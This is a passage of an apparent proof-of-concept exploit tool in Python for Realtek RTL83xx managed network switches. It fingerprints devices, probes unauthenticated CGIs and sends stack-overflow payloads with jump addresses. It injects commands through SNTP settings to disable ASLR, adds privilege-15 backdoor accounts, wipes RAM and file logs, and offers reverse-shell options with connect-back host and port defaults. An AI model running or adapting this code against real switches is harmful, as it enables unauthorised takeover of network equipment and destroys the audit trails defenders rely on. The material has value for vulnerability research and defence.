			SNTP.failure("Removing injection: Failed!")
			if self.Workaround:
				self.Workaround_logout()
			return False
		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				SNTP.status("Done")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				SNTP.failure(str(e))
				return False

		try:
			time.sleep(1)
			# Disable SNTP
			SNTP.status("Disable SNTP")
			query_args = self.target['exploit']['stack_cgi_sntp']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set_cmd_disable'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set_SIGSEGV']:
				SNTP.failure("Disable SNTP: Failed!")
				return False

			if self.Workaround:
				self.Workaround_logout()

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				SNTP.status("SNTP Disabled")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				SNTP.failure(str(e))
				return False


		if not ASLR_ENABLED:
			SNTP.success("Success")
			return True
		else:
			SNTP.failure("ASLR Enabled: Failure")
			return False

	#
	# Access: Unauthorized
	#
	def stack_cgi_log(self, target):
		self.target = target

		self.Workaround = self.target['exploit']['stack_cgi_log']['workaround']

		if self.Workaround:
			self.Workaround_logout()

		URI = self.target['exploit']['stack_cgi_log']['uri']

		logging = log.progress("Stack LOG disable & clean")
		if not self.target['exploit']['stack_cgi_log']['vulnerable']:
			logging.failure("No logging on this switch (?)")
			return True
		try:
			# Disable logging
			time.sleep(1)
			logging.status("Trying to disable")
			query_args = self.target['exploit']['stack_cgi_log']['content']
			query_args = query_args.replace("_JUMP_", struct.pack('>L',self.target['exploit']['stack_cgi_log']['log_settings_set'] + 0x58000000) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_log']['log_settings_set_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_log']['log_settings_set_SIGSEGV']:
				logging.failure("Disable: Failed!")
				return False

			if self.Workaround:
				self.Workaround_logout()
		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				logging.status("Disabled")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				logging.failure(str(e))
				return False

		try:
			# clean ram log
			time.sleep(1)
			logging.status("Trying to clean ramlog")
			query_args = self.target['exploit']['stack_cgi_log']['content']
			query_args = query_args.replace("_JUMP_", struct.pack('>L',self.target['exploit']['stack_cgi_log']['log_ramClear'] + 0x58000000) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_log']['log_ramClear_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_log']['log_ramClear_SIGSEGV']:
				logging.failure("Clean RAM: Failed!")
				return False
			if self.Workaround:
				self.Workaround_logout()
			logging.status("Cleaned")

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				logging.status("Cleaned")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				logging.failure(str(e))
				return False

		try:
			# clean file log
			time.sleep(1)
			logging.status("Trying to clean filelog")
			query_args = self.target['exploit']['stack_cgi_log']['content']
			query_args = query_args.replace("_JUMP_", struct.pack('>L',self.target['exploit']['stack_cgi_log']['log_fileClear'] + 0x58000000) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_log']['log_fileClear_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_log']['log_fileClear_SIGSEGV']:
				logging.failure("Clean FILE: Failed!")
				return False
			if self.Workaround:
				self.Workaround_logout()
			logging.status("Cleaned")

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				logging.status("Cleaned")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				logging.failure(str(e))
				return False

		if self.Workaround:
			self.Workaround_logout()

		logging.success("Success")

		return True

	#
	# Access: Unauthorized
	#
	def verify_target(self,target,check_all):
		self.target = target
		self.check_all = check_all

		self.headers['Content-Type'] = "multipart/form-data; boundary=-------"

		self.Workaround = self.target['exploit']['heack_cgi_shell']['workaround']

		sorted_dict = OrderedDict(sorted(self.target['verify'].items(), key=lambda t: t[0])) # sorted by key
		for check in sorted_dict:

			if self.Workaround:
				self.Workaround_logout()
			#
			# If we will try exploit, verify only that CGI
			#
			if not self.check_all:
				check = self.target['exploit']['heack_cgi_shell']['cgi']

			cgi = log.progress("{:.<30}".format(check))

			if not len(self.target['verify'][check]['content']) == 0:
				if self.target['verify'][check]['Content-Type']:
					query_args = "Content-Type\n\n" + self.target['verify'][check]['content']
				else:
					query_args = self.target['verify'][check]['content']

			if not self.target['verify'][check]['safe']:
				cgi.success("Vulnerable ({})".format(self.target['verify'][check]['content']))
				continue

			URI = self.target['verify'][check]['uri']

			if target.get('hash_uri'):
				URI += self.netgear_hash(URI)

			try:
				if not len(self.target['verify'][check]['content']) == 0:
					DEBUG("SEND",(URI, query_args))

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
				else:
					DEBUG("SEND",URI)

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded

				if self.target['verify'][check]['response'] == 'json':
					result = json.loads(response.read())
					DEBUG("RECV",result)

					if result['result'] == 1 and result['msg'] == "Invalid file format.":
						cgi.success("Vulnerable ({})".format(result['msg']))
						if not self.check_all:
							return True
					else:
						cgi.failure("NOT Vulnerable")
						if not self.check_all:
							return False

				elif self.target['verify'][check]['response'] == 'xss':
					response = re.split('["?=&<>]',response.read())	# bummer to split out '<>''
					DEBUG("RECV",response)

					count = 0
					for content in range(0,len(response)):
						if response[content] == self.target['verify'][check]['content_check']:
							cgi.success("Vulnerable")
							if not self.check_all:
								return True
						else:
							#
							# Since we split out '<>' above, make sure to count in 'script' and '/script'
							#
							if response[content] == 'alert(XSS);' and response[content-1] == 'script' and response[content+1] == '/script':
								count += 1
					if count:
						cgi.success("Vulnerable (XSS: {})".format(count))
						if not self.check_all:
							return True
					else:
						cgi.failure("NOT Vulnerable")
						if not self.check_all:
							return False

				elif self.target['verify'][check]['response'] == 'html':
					response = re.split("['()<>\n:,.&=]",response.read())
					DEBUG("RECV",response)

					for content in range(0,len(response)):
						if response[content] == self.target['verify'][check]['content_check'] or response[content] == 'Image CRC32 Error':
							cgi.success("Vulnerable ({})".format(response[content]))
							if not self.check_all:
								return True
						#
						# We checking what will be returned from the request
						# 1. The error message is correct
						# 2. LEN of our 'content' matching reported LEN from target
						#
						elif response[content] == 'errkey':
							if response[content+1] == self.target['verify'][check]['content_check'] and int(response[content+3]) == int(len(self.target['verify'][check]['content'])):
								cgi.success("Vulnerable ({})".format(response[content+1]))
								if not self.check_all:
									return True
							else:
								cgi.failure("NOT Vulnerable")
								if not self.check_all:
									return False
				
				elif self.target['verify'][check]['response'] == 'file':
					if self.target['verify'][check]['check_uri']:
						try:
							time.sleep(1) # Some checks needs to have some time
							URI = self.target['verify'][check]['check_uri']
							DEBUG("SEND",URI)

							response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
							response = response.read()
							DEBUG("RECV",response)

							if response == self.target['verify'][check]['content_check']:
								cgi.success("Vulnerable ({})".format(response))
								if not self.check_all:
									return True
							else:
								cgi.failure("NOT Vulnerable")
								if not self.check_all:
									return False

						except Exception as e:
							cgi.failure(str(e))
							return False
					else:
						cgi.failure("Not vulnerable")
						if not self.check_all:
							return False

				cgi.failure("Not vulnerable")
				if not self.check_all:
					return False

			except Exception as e:
				DEBUG("RECV",str(e))
				if e.code == 502:
					cgi.success("Vulnerable ({})".format(e))
					if not self.check_all:
						return True
					pass
				else:
					cgi.failure(str(e))
					return False

		return True

	#
	# Access: Unauthorized
	#
	def check_remote(self,etag):
		self.manualETag = etag

		remote = log.progress("Target")

		if self.manualETag:
			if self.manualETag == 'help':
				print("")
				remote.success("List of known targets")
			elif self.manualETag == 'info':
				print("")
				remote.success("Brief information of known targets")

			target = Vendor(self.manualETag).dict()
			if target:
				remote.success("{} ({} v{})".format(target['vendor'],target['model'],target['version']))
				return target
			else:
				remote.failure("Unknown ({})".format(self.manualETag))
				return False

		remote.status("Checking")
		URI = '/'
		DEBUG("SEND",URI)

		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,True) # encoded
		result = response.read().split()
		DEBUG("RECV",result)

		#
		# Use HTTP ETag to identify remote vendor and FW version, to choose right code/gadgets
		#
		self.ETag = response.info().get('ETag').replace('"','')
		DEBUG("RECV",response.info())

		target = Vendor(self.ETag).dict()
		if not target:
			remote.failure("Unknown ({})".format(self.ETag))
			return False

		if target:
			remote.success("{} ({} v{})".format(target['vendor'],target['model'],target['version']))
			if target['info_leak']:
				info_leak = log.progress("Model")
				URI = target['info_leak_uri']
				DEBUG("SEND",URI)

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,True) # encoded
				response = response.read()

				if target['info_leak_JSON']:
					result = json.loads(response)
					DEBUG("RECV",response)
					tmp = result.get('data')
					if tmp.get('description'):
						info_leak.success(result['data']['description'])
					elif tmp.get('productName'):
						info_leak.success(result['data']['productName'])
					elif tmp.get('title'):
						info_leak.success(result['data']['title'])
					else:
						info_leak.failure("Failed")
				else:
					response = re.split('[()<>\n:,.;=" ]',response)
					DEBUG("RECV",response)
					for check in range(0,len(response)):
						if response[check] == 'modelName':
							info_leak.success(response[check+2])
							return target
					info_leak.failure("Not found")
					print(response)

			return target

	#
	# Access: Unauthorized
	#
	def add_user(self,target):
		self.target = target

		add = log.progress("Adding credentials")

		if not self.target['exploit']['priv15_account']['vulnerable']:
			add.failure("Not listed as vulnerable")
			if self.target['exploit']['stack_cgi_add_account']['vulnerable']:
				return self.stack_add_account(self.target)
			else:
				return False

		USERNAME = self.credentials.split(':')[0]

		if USERNAME == 'admin' or USERNAME == 'cisco':
			log.failure("[bad boy] Username '{}' shall not be changed!".format(USERNAME))
			return False

		if target['exploit']['priv15_account']['encryption'] == 'md5':
			PASSWORD = self.md5hash(self.credentials.split(':')[1], base64encode=True)
		elif target['exploit']['priv15_account']['encryption'] == 'clear':
			PASSWORD = self.credentials.split(':')[1]
		elif target['exploit']['priv15_account']['encryption'] == 'nopassword':
			PASSWORD = 'nopassword' # dummy
		else:
			log.failure("No password type")
			return False

		query_args = self.target['exploit']['priv15_account']['content']
		query_args = query_args.replace('USERNAME',USERNAME)
		query_args = query_args.replace('PASSWORD',PASSWORD)

		log.info("Credentials: {}/{}".format(USERNAME,PASSWORD))

		try:
			add.status("Trying...")
			URI = target['exploit']['priv15_account']['add_uri']
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			response = response.read().split()
			DEBUG("RECV",response)
			for check in range(0,len(response)):
				if response[check] == 'init(){fileLoadWait();' or response[check] == 'id="reason">Merging' or response[check] == '(tmpStr.indexOf("FlashWriteDone")':
					add.success("Success")
					time.sleep(5) # Wait a bit so the account will be merged
					return True

		except Exception as e:
			add.failure("error {}".format(e))
			return False

		add.failure("Failed")
		print(response)
		return False

	#
	# Access: Authenticated
	#
	def del_user(self, target):
		self.target = target

		if not self.target['exploit']['priv15_account']['vulnerable']:
			remove.failure("Not listed as vulnerable")
			if self.target['exploit']['stack_cgi_del_account']['vulnerable']:
				return self.stack_del_account(self.target)
			else:
				return False

		USERNAME = self.credentials.split(':')[0]
		remove = log.progress("Remove credentials for {}".format(USERNAME))

		if USERNAME == 'admin' or USERNAME == 'cisco':
			remove.failure("[bad boy] Username '{}' shall not be deleted!".format(USERNAME))
			return False

		if self.check_XSID(self.target):
			self.headers['X-CSRF-XSID'] = self.Cisco_XSID(self.target)

		try:
			remove.status("Trying...")

			URI = target['exploit']['priv15_account']['del_uri']

			if len(self.target['exploit']['priv15_account']['del_query']) >= 1:
				query_args = self.target['exploit']['priv15_account']['del_query']
				query_args = query_args.replace('USERNAME',USERNAME)
				DEBUG("SEND",(URI, query_args))

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
				result = response
			else:
				URI = URI.replace('USERNAME',USERNAME)
				DEBUG("SEND",URI)

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
				result = response
				response = response.read()
				DEBUG("RECV",response)

			if not self.target['exploit']['priv15_account']['json']:
				if result.code == 200 and len(response) == 0:
					remove.success("Success")
					return True

				response = response.split("'")
				DEBUG("RECV",response)

				for check in range(0,len(response)):
					if response[check] == ': The user is not exist!!<br>' or response[check] == 'Error String':
						remove.failure("User do not exist")
						self.logout(self.target)
						return False
				remove.failure("Failed")
				self.logout(self.target)
				return False
			else:
				result = json.loads(response.read())
				DEBUG("RECV",result)

				if result['status'] == 'ok' and result['msgType'] == 'save_success':
					remove.success("Success")
					return True

		except Exception as e:
			log.info("error {}".format(e))
			return False

		remove.failure("Failed")
		print(result)
		return False

	#
	# Access: Authenticated
	#
	def logout(self, target):
		self.target = target

		logout = log.progress("Logging out")

		if not self.target['login']['vulnerable']:
			logout.failure("Not listed as vulnerable")
			return False

		logout.status("Trying...")

		if self.check_XSID(self.target):
			self.headers['X-CSRF-XSID'] = self.Cisco_XSID(self.target)

		URI = self.target['login']['logout_uri']
		DEBUG("SEND",URI)

		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,True) # encoded
		response = response.read()
		if not self.target['login']['json']:
			response = response.split()
			DEBUG("RECV",response)

			for check in range(0,len(response)):
				if response[check] == 'function goback(){' or response[check] == 'onload="goback();">': 
					logout.success("Success")
					return True

			logout.failure("Failed")
			return False

		else:
			result = json.loads(response)
			DEBUG("RECV",result)

			if result['status'] == 'ok' and result['msgType'] == 'success' or result['status'] == 'ok' and result['msgType'] == 'save_success':
				logout.success("Success")
				return True
			else:
				logout.failure("Failed")
				print(result)
				return False

	#
	# Access: Authenticated
	#
	def login(self,target):
		self.target = target

		login = log.progress("Login")

		if not self.target['login']['vulnerable']:
			login.failure("Not listed as vulnerable")
			return False

		#
		# login
		#
		try:
			USERNAME = self.credentials.split(':')[0]

			if self.target['login']['encryption'] == 'rsa':
				PASSWORD = self.RSA_Password(self.credentials.split(':')[1])
			elif self.target['login']['encryption'] == 'caesar':
				PASSWORD = self.caesar_encode(self.credentials.split(':')[1])
			elif self.target['login']['encryption'] == 'encode':
				PASSWORD = self.obfuscation_encode(self.credentials.split(':')[1])
			elif self.target['login']['encryption'] == 'clear':
				PASSWORD = self.credentials.split(':')[1]
			else:
				login.failure("No login password matching")
				return False

			query_args = self.target['login']['query']
			query_args = query_args.replace('USERNAME',USERNAME)
			query_args = query_args.replace('PASSWORD',PASSWORD)

			URI = self.target['login']['login_uri']
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			response = response.read()
			if not self.target['login']['json']:
				response = response.split()
				DEBUG("RECV",response)

				for check in range(0,len(response)):
					if response[check] == 'top.location.replace("/cgi-bin/dispatcher.cgi?cmd=1")' or response[check] == 'href="/cgi-bin/dispatcher.cgi?cmd=5890':
						login.success("Success")
						return True
					elif response[check] == 'window.location.replace("/cgi-bin/dispatcher.cgi?cmd=3");':
						login.success("Already logged in")
						return True
					elif response[check] == 'top.location.replace("/cgi-bin/dispatcher.cgi?cmd=5")':
						login.failure("Failed")
						return False
					elif len(response) == check + 1:
						login.failure("Not supported device")
						print(response)
						return False
			else:
				result = json.loads(response)
				DEBUG("RECV",result)

				if result['status'] == 'ok' and result['msgType'] == 'save_success' or result['status'] == 'ok' and result['msgType'] == 'success':
					login.status("Verifying")
					URI = self.target['login']['status_uri']
					DEBUG("SEND",URI)

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
					response = response.read()
					result = json.loads(response)
					DEBUG("RECV",result)

					if result['data']['status'] == 'ok':
						login.success("Success")
						return True
					elif result['data']['status'] == 'authing':
						time.sleep(2)
						# try one more time
						URI = self.target['login']['status_uri']
						login.status("One more time...")
						DEBUG("SEND",URI)

						response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
						response = response.read()
						result = json.loads(response)
						DEBUG("RECV",result)

						if result['data']['status'] == 'ok':
							login.success("Success")
							return True
						else:
							login.failure("Failed (Authing)")
							return False
					elif result['data']['status'] == 'fail':
						login.failure("Failed {}".format(result['data']['failReason']))
						return False

		except Exception as e:

			login.failure("error {}".format(e))

		return False

	#
	# Access: Authenticated
	#
	def disable_clean_log(self, target):
		self.target = target

		clear_log = log.progress("Logging disable & clean")

		if not self.target['log']['vulnerable']:
			clear_log.failure("Not listed as vulnerable")
			return False

		if self.check_XSID(self.target):
			self.headers['X-CSRF-XSID'] = self.Cisco_XSID(self.target)

		try:
			clear_log.status("Trying to disable")

			URI = self.target['log']['disable_uri']
			query_args = self.target['log']['disable_query']
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			response = response.read()
			DEBUG("RECV",response)

			URI = self.target['log']['status']
			DEBUG("SEND",URI)

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
			response = response.read()
			if not self.target['log']['json']:
				response = re.split("[<>\n]",response)
				DEBUG("RECV",response)

				for check in range(0,len(response)):
					if response[check] == 'window.location.replace("/cgi-bin/dispatcher.cgi?cmd=5120");':
						clear_log.status("Disabled")
						break
			else: # json
				result = json.loads(response)
				DEBUG("RECV",result)

				if result['data']['logState'] == False:
					clear_log.status("Disabled")
				else:
					clear_log.failure("Logging still enabled")
					return False

			clear_log.status("Trying to clean")

			URI = self.target['log']['clean_logfile_uri']
			query_args = self.target['log']['clean_logfile_query']
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			response = response.read()
			if not self.target['log']['json']:
				response = re.split("[<>'\n]",response)
				DEBUG("RECV",response)

				for check in range(0,len(response)):
					if response[check] == '/cgi-bin/dispatcher.cgi?cmd=5129' or response[check] == '/cgi-bin/dispatcher.cgi?cmd=4361':
						clear_log.status("Disabled")
						URI = self.target['log']['clean_logmem_uri']
						query_args = self.target['log']['clean_logmem_query']
						DEBUG("SEND",(URI, query_args))

						response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
						response = response.read()
						response = re.split("[<>'\n]",response)
						DEBUG("RECV",response)

						for check in range(0,len(response)):
							if response[check] == '/cgi-bin/dispatcher.cgi?cmd=5129' or response[check] == '/cgi-bin/dispatcher.cgi?cmd=4361':
								clear_log.success("Success")
								return True
						break
				clear_log.failure("Failed")
				return False
			else: # json
				result = json.loads(response)
				DEBUG("RECV",result)

				if result['status'] == 'ok' and result['msgType'] == 'save_success':
					URI = self.target['log']['clean_logmem_uri']
					query_args = self.target['log']['clean_logmem_query']
					DEBUG("SEND",(URI, query_args))

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
					response = response.read()
					result = json.loads(response)
					DEBUG("RECV",result)

					if result['status'] == 'ok' and result['msgType'] == 'save_success':
						clear_log.success("Success")
						return True
					else:
						clear_log.failure("Failed")
						return False
				else:
					clear_log.failure("Failed")
					return False

		except Exception as e:
			log.info("error {}".format(e))
			return False

		clear_log.failure("LOG Failed")
		return False

	#
	# Access: Authenticated
	#
	def SNTP(self, target):
		self.target = target

		SNTP = log.progress("SNTP")

		if not self.target['exploit']['sntp']['vulnerable']:
			SNTP.failure("Not listed as vulnerable")
			return False

		SNTP.status("Trying...")

		if self.check_XSID(self.target):
			self.headers['X-CSRF-XSID'] = self.Cisco_XSID(self.target)

		SNTP.status("Enable SNTP")

		URI = self.target['exploit']['sntp']['enable_uri']
		query_args = self.target['exploit']['sntp']['enable_query']

		DEBUG("SEND",(URI, query_args))
		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
		response = response.read()

		if not self.target['exploit']['sntp']['json']:
			response = re.split("[<>\n]",response)
			DEBUG("RECV",response)

			for check in range(0,len(response)):
				if response[check] == 'SNTP':
					if response[check+5] == 'Enabled' or response[check+5] == 'Enable' or response[check+7] == 'Enabled' or response[check+7] == 'Enable':
						SNTP.status("SNTP Enabled")
					elif response[check+5] == 'Disabled' or response[check+5] == 'Disable' or response[check+7] == 'Disabled' or response[check+7] == 'Disable':
						SNTP.failure("SNTP Disabled")
						return False
					else:
						SNTP.failure("Enable SNTP Failed")
						return False

		else: # json
			response = self.clean_json(response)
			result = json.loads(response)
			DEBUG("RECV",result)

			if result['status'] == 'ok' and result['msgType'] == 'save_success':
				URI = self.target['exploit']['sntp']['status_uri']
				DEBUG("SEND",URI)

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
				response = response.read()
				response = self.clean_json(response)
				result = json.loads(response)
				DEBUG("RECV",result)

				for status in result['data']:
					if status == 'sntp' and result['data']['sntp'] == True:
						SNTP.status("SNTP Enabled")
						break
					elif status == 'sntp' and result['data']['sntp'] == False:
						SNTP.failure("SNTP Disabled")
						return False
					elif status == 'sntpStatus' and result['data']['sntpStatus'] == True:
						SNTP.status("SNTP Enabled")
						break
					elif status == 'sntpStatus' and result['data']['sntpStatus'] == False:
						SNTP.failure("SNTP Disabled")
						return False

			else:
				SNTP.failure("Enable SNTP Failed")
				return False

		URI = self.target['exploit']['sntp']['inject_uri']
		query_args = self.target['exploit']['sntp']['inject_query']
		DEBUG("SEND",(URI, query_args))

		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
		response = response.read()
		if not self.target['exploit']['sntp']['json']:
			response = response.split('"')
			DEBUG("RECV",response)

			for check in range(0,len(response)):
				if response[check] == '/cgi-bin/dispatcher.cgi?cmd=549':
					query_args = self.target['exploit']['sntp']['check_query']
					DEBUG("SEND",(URI, query_args))

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
					response = response.read()
					response = response.split('"')
					DEBUG("RECV",response)

					for check in range(0,len(response)):
						if response[check] == '/cgi-bin/dispatcher.cgi?cmd=549':
							URI = self.target['exploit']['sntp']['verify_uri']
							DEBUG("SEND",URI)

							response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
							response = response.read().split()
							DEBUG("RECV",response)

							if response[0] == '0':
								SNTP.status("ASLR disabled")
								break
							else:
								SNTP.failure("Check Failed")
								return False
					break


		else: # json
			response = self.clean_json(response)
			result = json.loads(response)
			DEBUG("RECV",result)

			if result['status'] == 'ok' and result['msgType'] == 'save_success':
				query_args = self.target['exploit']['sntp']['check_query']
				DEBUG("SEND",(URI, query_args))

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
				response = response.read()
				response = self.clean_json(response)
				result = json.loads(response)
				DEBUG("RECV",result)

				if result['status'] == 'ok' and result['msgType'] == 'save_success':
					URI = self.target['exploit']['sntp']['verify_uri']
					DEBUG("SEND",URI)

					response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
					response = response.read().split()
					DEBUG("RECV",response)

					if response[0] == '0':
						SNTP.status("ASLR disabled")
					else:
						SNTP.failure("Check Failed")
						return False
				else:
					SNTP.failure("RCE #2 Failed")
					return False
			else:
				SNTP.failure("RCE #1 Failed")
				return False

		SNTP.status("Removing RCE")
		URI = self.target['exploit']['sntp']['delete_uri']
		query_args = self.target['exploit']['sntp']['delete_query']
		DEBUG("SEND",(URI, query_args))

		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
		response = response.read()
		if not self.target['exploit']['sntp']['json']:
			response = response.split('"')
			DEBUG("RECV",response)

			for check in range(0,len(response)):
				if response[check] == '/cgi-bin/dispatcher.cgi?cmd=549':
					SNTP.status("RCE Removed")
					break
		else: # json
			response = self.clean_json(response)
			result = json.loads(response)
			DEBUG("RECV",result)

			if result['status'] == 'ok' and result['msgType'] == 'save_success':
				SNTP.status("RCE Removed")
			else:
				SNTP.failure("RCE Remove Failed")
				return False

		URI = self.target['exploit']['sntp']['disable_uri']
		query_args = self.target['exploit']['sntp']['disable_query']
		DEBUG("SEND",(URI, query_args))

		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
		response = response.read()
		if not self.target['exploit']['sntp']['json']:
			response = re.split("[<>\n]",response)
			DEBUG("RECV",response)

			for check in range(0,len(response)):
				if response[check] == 'SNTP':

					if response[check+5] == 'Enabled' or response[check+5] == 'Enable' or response[check+7] == 'Enabled' or response[check+7] == 'Enable':
						SNTP.failure("SNTP Enabled")
					elif response[check+5] == 'Disabled' or response[check+5] == 'Disable' or response[check+7] == 'Disabled' or response[check+7] == 'Disable':
						SNTP.status("SNTP Disabled")
					else:
						SNTP.failure("Disable SNTP Failed")
						return False

		else: # json
			response = self.clean_json(response)
			result = json.loads(response)
			DEBUG("RECV",result)

			if result['status'] == 'ok' and result['msgType'] == 'save_success':
				URI = self.target['exploit']['sntp']['status_uri']
				DEBUG("SEND",URI)

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
				response = response.read()
				response = self.clean_json(response) # MCW TEST
				result = json.loads(response)
				DEBUG("RECV",result)

				for status in result['data']:
					if status == 'sntp' and result['data']['sntp'] == True:
						SNTP.failure("SNTP Enabled")
						return False
					elif status == 'sntp' and result['data']['sntp'] == False:
						SNTP.status("SNTP Disabled")
						break
					elif status == 'sntpStatus' and result['data']['sntpStatus'] == True:
						SNTP.failure("SNTP Enabled")
						return False
					elif status == 'sntpStatus' and result['data']['sntpStatus'] == False:
						SNTP.status("SNTP Disabled")
						break

			else:
				SNTP.failure("Disable SNTP Failed")
				return False


		SNTP.success("ASLR: Success")
		return True



if __name__ == '__main__':

	#
	# Help, info and pre-defined values
	#	
	INFO =  'Realtek Managed Switch Controller RTL83xx PoC (2019 bashis)\n'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	raw_request = True
	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'			# Default Local PORT
	creds = 'pwn:pwn'		# creds = 'user:pass'
	etag = ''

	#
	# Try to parse all arguments
	#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		if creds:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')

		arg_parser.add_argument('--hydra', required=False, default=False, action='store_true', help='Boa/Hydra Web Server - reverse shell')
		arg_parser.add_argument('--force', required=False, default=False, action='store_true', help='Ignore warnings for exploits marked not safe')
		arg_parser.add_argument('--etag', required=False, help='Select target manually with their ETag')

		arg_parser.add_argument('--shell', required=False, default=False, action='store_true', help='Unauthenticated - reverse shell - CGIs')

		arg_parser.add_argument('--debug', required=False, default=False, action='store_true', help='Debug SEND/RECV data and line numbers in code')

		arg_parser.add_argument('--verify', required=False, default=False, action='store_true', help='Verify unauthenticated vulnerabilities - CGIs')
		arg_parser.add_argument('--report', required=False, default=False, action='store_true', help='Generate report based on dictionary')

		arg_parser.add_argument('--adduser', required=False, default=False, action='store_true', help='Add "'+ creds + '" with privilege 15')
		arg_parser.add_argument('--deluser', required=False, default=False, action='store_true', help='Delete "'+ creds + '" credentials')

		args = arg_parser.parse_args()
	except Exception as e:
		log.info(INFO)
		log.info("Error: {}".format(e))
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	print("")
	log.info(INFO)

	if args.report:
		Vendor("report").dict()
		sys.exit(0)

	if args.debug:
		debug = True

	if args.force:
		force = True
	#
	# Check validity, update if needed, of provided options
	#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if creds and args.auth:
		creds = args.auth

	if args.rport:
